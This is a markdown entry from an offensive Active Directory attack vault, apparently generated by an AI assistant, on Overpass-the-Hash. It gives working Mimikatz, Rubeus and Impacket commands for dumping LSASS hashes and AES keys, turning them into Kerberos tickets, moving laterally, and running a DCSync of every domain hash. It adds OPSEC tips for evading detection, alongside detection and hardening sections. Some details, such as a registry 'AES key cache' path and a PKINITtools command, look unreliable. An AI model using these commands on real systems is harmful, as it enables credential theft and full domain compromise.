---
title: "Attack #6 — Overpass-the-Hash (Pass-the-Key)"
description: "Overpass-the-Hash (OPtH) is a hybrid attack that converts a stolen NTLM hash into a fully valid Kerberos TGT. This is the critical conceptual bridge in…"
category: active-directory
tags: ["active-directory", "kerberos", "ntlm", "hashing"]
tools: ["NetExec", "Impacket", "Mimikatz", "Rubeus", "BloodHound"]
difficulty: advanced
updated: "2026-08-10"
source: "vault:ActiveDirectory/AD-Attack/Category-One/🔴 Attack #6 — Overpass-the-Hash (Pass-the-Key).md"
---
# 🔴 Attack #6 — Overpass-the-Hash (Pass-the-Key)

***

## 📖 How It Works

Overpass-the-Hash (OPtH) is a **hybrid attack that converts a stolen NTLM hash into a fully valid Kerberos TGT**. This is the critical conceptual bridge in the AD attack chain — PtH abuses NTLM directly, PtT replays stolen Kerberos tickets, but Overpass-the-Hash uses a raw NT hash as a cryptographic key to *request* a fresh TGT from the KDC, effectively laundering an NTLM credential into a Kerberos one. Once you have that TGT, you operate entirely within Kerberos — bypassing NTLM-blocking controls, MFA, and many detection signatures simultaneously.

The attack exploits the internal Windows authentication architecture: when Kerberos pre-authentication runs, it uses a key derived from the user's password — and crucially, the **NT hash IS that key** (RC4-HMAC). The DC cannot distinguish between a key derived legitimately from a password typed by a user and a key supplied directly as an NT hash by an attacker. The result is a legitimate, KDC-signed TGT that grants access to everything the victim account can reach.

> ⚠️ **Windows Server 2022+ / Credential Guard & AES-Only Enforcement:** On hardened systems with AES-only enforcement, RC4 (NT hash) requests are rejected by the KDC entirely. Extraction of AES128/AES256 keys from LSASS becomes essential. Additionally, Credential Guard blocks LSASS access for key extraction. See "Hardening Commands" for mitigation strategies.

### Overpass-the-Hash vs Pass-the-Hash vs Pass-the-Ticket

| Property | PtH | OPtH | PtT |
|---|---|---|---|
| **Input** | NT hash | NT hash / AES key | Existing Kerberos ticket |
| **Protocol** | NTLM | NTLM → converts to **Kerberos** | Kerberos only |
| **Output** | NTLM session | **Fresh TGT** + TGS tickets | Reused ticket |
| **Works if NTLM blocked** | ❌ | ✅ (Kerberos output) | ✅ |
| **Works without live session** | ✅ | ✅ | ❌ (needs existing ticket) |
| **AES key support** | ❌ | ✅ (stealthiest variant) | N/A |
| **Detection footprint** | 4624 Type 3 NTLM | 4768 + 4769 Kerberos | 4769 Kerberos |

### The Full Attack Flow

```
1. Compromise any Windows host + escalate to local admin / SYSTEM
2. Dump NTLM hash (NT hash) from LSASS — identical to PtH setup phase
3. Optionally extract AES128 / AES256 key instead (stealthier, no RC4 downgrade)
4. Use Mimikatz sekurlsa::pth OR Rubeus asktgt to:
   a. Inject the NT hash as a Kerberos RC4 key
   b. Send a Kerberos AS-REQ to the DC requesting a TGT
   c. DC validates the key, issues a signed TGT
5. TGT injected into current logon session → now operating as victim in Kerberos
6. Request TGS for any target service → lateral movement / privilege escalation
```

***

## ⚙️ Prerequisites

| Requirement | Detail |
|---|---|
| **Local admin / SYSTEM on a host** | Required to dump LSASS (NT hash or AES key extraction) |
| **NT hash or AES key** | NT hash (RC4) is universal; AES128/256 keys are available from Mimikatz `sekurlsa::ekeys` |
| **Port 88 reachable** | Kerberos TGT request goes directly to the DC on UDP/TCP 88 |
| **Valid domain account** | The hash must belong to an active, non-locked domain account |
| **Domain FQDN / DC IP** | Must know the domain name and DC address for TGT request |

***

## 🛠️ Tools

| Tool | Platform | Notes |
|---|---|---|
| **Mimikatz** | Windows | `sekurlsa::pth` with Kerberos flag spawns session + requests TGT |
| **Rubeus** | Windows | `asktgt` command — cleanest method; full AES key support |
| **Impacket — getTGT.py** | Linux | Hash-to-TGT from Linux; outputs .ccache for use with all Impacket tools |
| **Impacket — getST.py** | Linux | Hash-to-TGS directly for specific services |
| **NetExec / CrackMapExec** | Linux | `-H` flag with Kerberos auth (`--use-kcache`) after TGT obtained |
| **PKINITtools** | Windows/Linux | Use certificate-based PKINIT to request TGT without credentials (advanced) |

***

## 💻 Full Commands

### 🔵 Step 0 — Dump NT Hash AND AES Keys from LSASS

```powershell
# ── Mimikatz — dump NT hashes (standard) ─────────────────────────────────────
privilege::debug
sekurlsa::logonpasswords
# Note the 'NTLM' field under each account — that's your NT hash

# ── Mimikatz — dump AES keys (stealthier OPtH) ───────────────────────────────
privilege::debug
sekurlsa::ekeys
# Note the 'aes256_hmac' and 'aes128_hmac' fields — use these for stealth
# AES keys look like: 'b65fb27c8e0d7c5f48b16c10b4c1d91a...'

# ── Linux — remote dump via secretsdump ──────────────────────────────────────
secretsdump.py corp.local/Administrator:'Password1'@10.10.10.10
# NT hash is the right side of DOMAIN\user:RID:LMhash:NThash:::
```

***

### 🔴 Mimikatz — Classic OPtH (Windows, Spawns Kerberos Session)

```powershell
# ── Standard OPtH with NT hash (RC4) ─────────────────────────────────────────
# This spawns a new cmd.exe process, then AUTOMATICALLY requests a TGT from KDC
privilege::debug
sekurlsa::pth /user:Administrator /domain:corp.local /ntlm:8846f7eaee8fb117ad06bdd830b7586c

# This opens a new command window — from that window, force Kerberos TGT request:
dir \\DC01.corp.local\C$
# The act of accessing a Kerberos resource triggers the TGT request internally

# ── OPtH with AES256 key (stealthiest — no RC4 negotiation) ──────────────────
sekurlsa::pth /user:Administrator /domain:corp.local \
  /aes256:b65fb27c8e0d7c5f48b16c10b4c1d91a9b3c2d4e5f6a7b8c9d0e1f2a3b4c5d6

# ── OPtH with AES128 key ──────────────────────────────────────────────────────
sekurlsa::pth /user:svc_sql /domain:corp.local \
  /aes128:a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6

# ── OPtH with specific program instead of cmd.exe ────────────────────────────
sekurlsa::pth /user:Administrator /domain:corp.local \
  /ntlm:8846f7eaee8fb117ad06bdd830b7586c /run:powershell.exe

# ── Verify TGT was obtained from within the spawned shell ────────────────────
klist
# You should see a TGT for the injected user — proof of successful OPtH
```

> **What happens internally:** Mimikatz creates a new logon session (Type 9 — NewCredentials), injects the NT hash as the user's credential material, and when you first touch a Kerberos resource (e.g., `dir \\DC01.corp.local\...`), Windows uses the injected hash as an RC4 key to authenticate to the KDC and request a TGT. From that point on, all authentication flows through Kerberos.

***

### 🔴 Rubeus — asktgt (Windows — Most Explicit & Controllable)

```powershell
# ── Request TGT using NT hash (RC4) ──────────────────────────────────────────
.\Rubeus.exe asktgt /user:Administrator /domain:corp.local \
  /rc4:8846f7eaee8fb117ad06bdd830b7586c /ptt

# Request TGT + inject into current session (/ptt = pass-the-ticket)
.\Rubeus.exe asktgt /user:Administrator /domain:corp.local \
  /rc4:8846f7eaee8fb117ad06bdd830b7586c /ptt /nowrap

# ── Request TGT using AES256 (stealthiest — no downgrade warning in logs) ─────
.\Rubeus.exe asktgt /user:Administrator /domain:corp.local \
  /aes256:b65fb27c8e0d7c5f48b16c10b4c1d91a9b3c2d4e5f6a7b8c9d0e1f2a3b4c5d6 \
  /ptt /nowrap

# ── Request TGT using AES128 ─────────────────────────────────────────────────
.\Rubeus.exe asktgt /user:svc_backup /domain:corp.local \
  /aes128:a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6 /ptt

# ── Request TGT + save to file (for transfer to Linux) ───────────────────────
.\Rubeus.exe asktgt /user:Administrator /domain:corp.local \
  /rc4:8846f7eaee8fb117ad06bdd830b7586c /outfile:admin.kirbi

# ── Request TGT + immediately request TGS for specific service ───────────────
.\Rubeus.exe asktgt /user:Administrator /domain:corp.local \
  /rc4:8846f7eaee8fb117ad06bdd830b7586c /ptt

.\Rubeus.exe asktgs /service:cifs/DC01.corp.local /ptt

# ── Specify DC explicitly (useful in multi-domain environments) ───────────────
.\Rubeus.exe asktgt /user:Administrator /domain:corp.local \
  /rc4:8846f7eaee8fb117ad06bdd830b7586c /dc:10.10.10.10 /ptt

# ── Verify TGT injection ──────────────────────────────────────────────────────
.\Rubeus.exe triage
klist
```

***

### 🔴 Impacket — getTGT.py (Linux — Hash → ccache Ticket)

```bash
# ── NT hash → TGT (saves as Administrator.ccache) ───────────────────────────
getTGT.py corp.local/Administrator -hashes :8846f7eaee8fb117ad06bdd830b7586c \
  -dc-ip 10.10.10.10

# ── AES256 key → TGT (stealthiest from Linux) ────────────────────────────────
getTGT.py corp.local/Administrator \
  -aesKey b65fb27c8e0d7c5f48b16c10b4c1d91a9b3c2d4e5f6a7b8c9d0e1f2a3b4c5d6 \
  -dc-ip 10.10.10.10

# ── Plaintext password → TGT (standard — for reference) ─────────────────────
getTGT.py corp.local/Administrator:'Password1' -dc-ip 10.10.10.10

# ── Set the TGT ccache for use by all Impacket tools ─────────────────────────
export KRB5CCNAME=Administrator.ccache

# ── Use the TGT for lateral movement ─────────────────────────────────────────
psexec.py -k -no-pass corp.local/Administrator@DC01.corp.local
wmiexec.py -k -no-pass corp.local/Administrator@DC01.corp.local
smbexec.py -k -no-pass corp.local/Administrator@DC01.corp.local
secretsdump.py -k -no-pass corp.local/Administrator@DC01.corp.local

# ── NetExec with the obtained TGT ────────────────────────────────────────────
export KRB5CCNAME=Administrator.ccache
nxc smb DC01.corp.local --use-kcache
nxc smb DC01.corp.local --use-kcache -x "whoami /all"
nxc winrm DC01.corp.local --use-kcache

# ── Evil-WinRM with TGT ───────────────────────────────────────────────────────
export KRB5CCNAME=Administrator.ccache
evil-winrm -i DC01.corp.local -r corp.local
```

***

### 🔴 Impacket — getST.py (Linux — Hash → Specific Service Ticket)

```bash
# Skip the TGT step entirely — go straight to a TGS for a specific service
# Useful when you know exactly what you want to access

# Get CIFS TGS (file share access) using NT hash
getST.py corp.local/Administrator -hashes :8846f7eaee8fb117ad06bdd830b7586c \
  -spn cifs/DC01.corp.local -dc-ip 10.10.10.10

# Get HOST TGS (remote execution via PsExec)
getST.py corp.local/Administrator -hashes :8846f7eaee8fb117ad06bdd830b7586c \
  -spn host/DC01.corp.local -dc-ip 10.10.10.10

# Get LDAP TGS (BloodHound, LDAP queries, DCSync)
getST.py corp.local/Administrator -hashes :8846f7eaee8fb117ad06bdd830b7586c \
  -spn ldap/DC01.corp.local -dc-ip 10.10.10.10

# Get HTTP TGS (web services, Exchange)
getST.py corp.local/svc_http -hashes :a87f3a337d73085c45f9416be5787d86 \
  -spn http/MAIL01.corp.local -dc-ip 10.10.10.10

# ── Use the service ticket ────────────────────────────────────────────────────
export KRB5CCNAME=Administrator@cifs_DC01.corp.local@CORP.LOCAL.ccache
smbclient.py -k -no-pass corp.local/Administrator@DC01.corp.local
```

***

### 🔴 PKINITtools — Certificate-Based TGT Request (Advanced)

```powershell
# ── Get DER certificate from compromised user (if available) ────────────────
# Export user certificate from smartcard or AD user object
certutil -user -enterprise -p "password" -exportpfx "LDAP:///CN=Administrator,CN=Users,DC=corp,DC=local" output.pfx

# ── Use PKINITtools to request TGT with certificate ──────────────────────────
# Note: Requires user certificate in .pfx format; no password/hash needed
python3 pkinittools.py \
  -certificate output.pfx \
  -password "cert_password" \
  -domain corp.local \
  -dc-ip 10.10.10.10

# Resulting TGT can be used with any of the above methods
```

***

### 🔴 Full OPtH → DCSync Chain (Linux)

```bash
# Step 1 — Convert NT hash to TGT
getTGT.py corp.local/Administrator -hashes :8846f7eaee8fb117ad06bdd830b7586c \
  -dc-ip 10.10.10.10

# Step 2 — Set TGT
export KRB5CCNAME=Administrator.ccache

# Step 3 — Get LDAP TGS for DCSync (requires Replication rights)
getST.py corp.local/Administrator -k -no-pass \
  -spn ldap/DC01.corp.local -dc-ip 10.10.10.10

# Step 4 — DCSync all domain hashes using Kerberos ticket
export KRB5CCNAME=Administrator@ldap_DC01.corp.local@CORP.LOCAL.ccache
secretsdump.py -k -no-pass corp.local/Administrator@DC01.corp.local -just-dc-ntlm

# Result: All domain user NTLM hashes — game over
```

***

## 🎯 OPSEC Tips

- **Always prefer AES256 over RC4** — RC4 (NT hash) downgrade in a modern AES-enforcement environment is a near-instant detection signature
- **Extract AES keys with `sekurlsa::ekeys`** in Mimikatz — same LSASS access, but produces AES128/256 keys that blend into normal Kerberos traffic
- **Use Rubeus `asktgt` over Mimikatz `sekurlsa::pth`** for more granular control and cleaner ticket format — Mimikatz's internal TGT request is less predictable
- **Name your ccache file sensibly** — `Administrator.ccache` is readable; rename to something benign for long-term operations
- **Use FQDN not IP** — Kerberos is hostname-based; `DC01.corp.local` works, `10.10.10.10` does not
- **AES key OPtH produces Event 4768 with `etype:18`** (AES256) which is indistinguishable from legitimate user authentication in most environments
- **RC4 OPtH produces Event 4768 with `etype:23`** (RC4) — in AES-enforced domains this is an immediate red flag; avoid unless RC4 is still standard

### OpSec Ranking by Stealth

| Method | Stealth | Speed | Notes |
|---|---|---|---|
| **AES256 via Rubeus asktgt** | ⭐⭐⭐⭐⭐ | Fast | No RC4 downgrade, blends perfectly into normal Kerberos traffic |
| **AES256 via getTGT.py (Linux)** | ⭐⭐⭐⭐⭐ | Fast | Off-network execution, minimal DC communication |
| **RC4 via Rubeus asktgt** | ⭐⭐⭐ | Fast | Detectable in AES-enforced domains (etype:23 anomaly) |
| **Mimikatz sekurlsa::pth + Kerberos** | ⭐⭐ | Medium | Tool signature + Type 9 logon event = high detection risk |
| **PKINITtools (certificate-based)** | ⭐⭐⭐⭐⭐ | Medium | No hash/password needed; requires certificate access |

### Time-to-Execute Estimates

- **Full OPtH with Rubeus (extract hash → asktgt → ptt → access resource):** 3 minutes
- **Linux OPtH chain (getTGT → getST → secretsdump):** 5 minutes
- **Mimikatz sekurlsa::pth (spawn session + wait for Kerberos use):** 2–4 minutes
- **PKINITtools certificate request:** 2 minutes

### Tool Version Compatibility

- **Rubeus v1.6.4+:** `asktgt` command fully stable with RC4, AES support; no major regressions
- **Mimikatz 2.2.0+:** `sekurlsa::pth` and `sekurlsa::ekeys` work consistently across Windows versions
- **Impacket (current):** getTGT.py, getST.py fully support RC4/AES; requires Python 3.6+
- **NetExec latest:** `--use-kcache` works with ccache from OPtH + getTGT chain
- **Evil-WinRM v4.0+:** KRB5CCNAME stable; requires krb5-user library on Linux

***

## 🛡️ Detection — Event IDs

| Event ID | Source | What to Look For |
|---|---|---|
| **4768** | Security Log | TGT requested — **`EncryptionType: 0x17` (RC4/etype 23)** in an AES-enforced domain |
| **4768** | Security Log | TGT request originates from **unexpected workstation** for that user account |
| **4624** | Security Log | Logon **Type 9 (NewCredentials)** — Mimikatz `sekurlsa::pth` always creates this logon type |
| **4648** | Security Log | Logon with explicit credentials — attacker accessing remote resource post-OPtH |
| **4769** | Security Log | TGS requested immediately after a suspicious 4768 — confirms ticket is being used |
| **Sysmon EID 10** | Sysmon | LSASS process access — AES key extraction same as NT hash dump |
| **Sysmon EID 1** | Sysmon | `Rubeus.exe` or `Mimikatz.exe` process creation |

**Primary detection signature:** Event 4768 with `EncryptionType: 0x17` (RC4) from a host where the user is not currently interactively logged in, followed immediately by a 4769 TGS request. The Type 9 logon event (4624) from Mimikatz `pth` is also highly anomalous and rarely appears in legitimate traffic — a single Type 9 event warrants investigation.

***

## 🧩 Troubleshooting

| Error | Cause | Fix |
|---|---|---|
| `KRB_AP_ERR_SKEW` | System time skew between attacker and DC (>5 min) | Sync attacker system time with DC: `net time \\DC01 /set` or `timedatectl set-ntp true` |
| `KDC_ERR_ETYPE_NOSUPP` | Encryption type not supported (RC4 requested but AES-only enforced) | Extract AES key via `sekurlsa::ekeys`; use AES key with asktgt or getTGT.py |
| `KDC_ERR_PREAUTH_FAILED` | NT hash/AES key is incorrect or account is disabled/locked | Verify hash accuracy from LSASS dump; check AD for account lockout status |
| `ERR_KRB5_KDC_UNREACH` | Cannot reach KDC on port 88 (firewall, routing, or DNS) | Test: `nc -zv DC01.corp.local 88`; verify DNS resolves DC FQDN correctly |
| `KDC_ERR_C_PRINCIPAL_UNKNOWN` | User account does not exist in domain or is misspelled | Verify account name matches AD; check domain FQDN |
| `Rubeus asktgt returns null TGT` | DC rejected the Kerberos request (likely bad hash or pre-auth failure) | Re-verify NT hash from LSASS; check account pre-auth requirements in AD |
| `Type 9 logon in security log (immediate detection)** | Mimikatz `sekurlsa::pth` creates this signature automatically | Switch to Rubeus `asktgt` which doesn't generate Type 9 events |
| `FIPS mode rejects RC4 OPtH` | System has FIPS 140-2 enabled; RC4 disabled | Use AES256/AES128 key extraction instead of NT hash |

***

## 🗺️ MITRE ATT&CK

**Technique:** T1550.002 — Use Alternate Authentication Material: Pass the Hash
**Tactic:** TA0008 — Lateral Movement

### Known APT Groups Using OPtH

- **APT29 (Cozy Bear):** Leverages OPtH to bypass NTLM-disabled defenses and maintain persistence in Kerberos-only environments
- **FIN6 (Magecart operators):** Uses OPtH chains for sustained lateral movement in retail and hospitality environments
- **Wizard Spider (Conti operators):** Combines OPtH with Golden Ticket generation for long-term domain control
- **HAFNIUM (State-sponsored, China-based):** Employs OPtH in post-exploitation chains following Exchange Server compromise

**Detection baseline:** Organizations using Defender for Identity should flag RC4 TGT requests (etype:23) in AES-only environments as critical alerts. AES TGT requests with suspicious source IPs should trigger investigation.

***

## 🛡️ Advanced Detection & Hardening

### Sigma Rule References

- **Sigma Rule: RC4 OPtH in AES-enforced environment** — Event 4768 with etype:23 from non-user workstation
- **Sigma Rule: Type 9 logon + Kerberos activity** — Event 4624 (Type 9) followed by 4768/4769 within 60 seconds
- **Sigma Rule: AES key extraction** — Sysmon EID 10 (LSASS access) + sekurlsa::ekeys string detection

### EDR Detections (Defender for Identity)

- **"Suspicious encryption type downgrade"** — RC4 TGT request when domain policy enforces AES
- **"Impossible travel"** — OPtH TGT created on one host but used immediately on another
- **"LSASS credential access + Kerberos activity"** — Combination of memory access and unexpected TGT request

### Hardening Commands

```powershell
# ── Enforce AES-only Kerberos (disable RC4) ───────────────────────────────────
# On DC: Set encryption types to 28 (AES128 + AES256 only)
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\Kerberos\Parameters" \
  -Name "SupportedEncryptionTypes" -Value 28

# ── Enable Credential Guard (blocks LSASS memory access) ─────────────────────
dism /online /enable-feature /featurename:IsolatedUserMode

# ── Enforce Protected Users group (prevents RC4 fallback) ───────────────────
Add-ADGroupMember -Identity "Protected Users" -Members "CN=Administrator,CN=Users,DC=corp,DC=local"

# ── Set maximum TGT lifetime (reduce reuse window) ─────────────────────────
# Via GPO: Kerberos Policy > Maximum lifetime for user ticket = 4 hours (default 10)

# ── Monitor for Type 9 logon events (Mimikatz signature) ──────────────────────
# Create alert for Event 4624 with LogonType=9 from unexpected sources
```

### Forensic Artifacts (What Survives)

| Artifact | Location | Survives Cleanup | Notes |
|---|---|---|---|
| **Event 4768 (TGT request)** | Security Event Log | Yes (unless purged) | Primary detection source; etype field is critical |
| **Event 4624 Type 9 logon** | Security Event Log | Yes | Mimikatz sekurlsa::pth signature — rarely legitimate |
| **NT hash in LSASS dump** | Pagefile, hiberfil.sys | If not cleared | Post-mortem DFIR via Volatility |
| **LSASS process access (Sysmon)** | Sysmon event log | Yes | EID 10 correlates with OPtH timing |
| **ccache file (Linux)** | /tmp/krb5cc_* | No — delete immediately | Not useful after ticket expires or is rotated |
| **Rubeus/Mimikatz execution** | Sysmon EID 1, MFT | Yes | Tool signatures in process creation logs |
| **Registry AES key cache** | User registry hive | Yes | HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings |

***

## 🔗 Attack Chain Context

```
[Overpass-the-Hash] ──→ Fresh Kerberos TGT as Target User
         │
         ├──→ 🎫 Pass-the-Ticket (inject TGT, access any domain resource)
         ├──→ 🩸 DCSync — use LDAP TGS with DA TGT to dump all hashes
         ├──→ 🎫 Golden Ticket — KRBTGT hash from DCSync → forge unlimited TGTs
         ├──→ 🔓 Bypass NTLM-blocking security controls entirely
         ├──→ 🌐 Cross-domain — use TGT to request inter-realm tickets
         └──→ 🎯 MFA bypass — TGT already authenticated, no MFA prompt triggered
```

### Cross-References to Related Attacks

- **Attack #4 — Pass-the-Hash (PtH):** Uses NT hash with NTLM directly; OPtH converts hash to Kerberos
- **Attack #5 — Pass-the-Ticket (PtT):** Takes output TGT from OPtH and injects it into other sessions
- **Attack #11 — Golden Ticket:** If you obtain KRBTGT hash (via DCSync using OPtH), forge unlimited TGTs
- **Attack #12 — Silver Ticket:** Forge service-specific tickets; complementary to OPtH
- **Attack #16 — Constrained Delegation (S4U2Self/S4U2Proxy):** Uses TGTs to request tickets on behalf of other users

### When to Use OPtH vs PtH

Use **PtH** when: NTLM is available, you want immediate access, and speed matters over stealth.

Use **OPtH** when: the target enforces Kerberos-only authentication, NTLM is blocked or monitored, you want a long-lived TGT for sustained access, or you have AES keys and want to leave minimal forensic trace.

***

> ✅ **Attack #6 — Overpass-the-Hash complete.** Tell me to move on when you're ready for **Attack #7 — NTLM Relay Attacks**.

Sources
 How to Defend Against an Overpass the Hash Attack - Semperis https://www.semperis.com/blog/how-to-defend-against-overpass-the-hash-attack/
 Pass-the-Key (Overpass-the-... https://www.vaadata.com/blog/what-is-pass-the-hash-attacks-types-and-security-best-practices/
 Overpass-the-Hash Attack: Principles and Detection https://blog.netwrix.com/2022/10/04/overpass-the-hash-attacks/
 Use Alternate Authentication Material: Pass the Hash https://attack.mitre.org/techniques/T1550/002/
 Active Directory Attack Chain: PtH → OPtH → PtT → DCSync https://www.semperis.com/blog/active-directory-attack-chains/
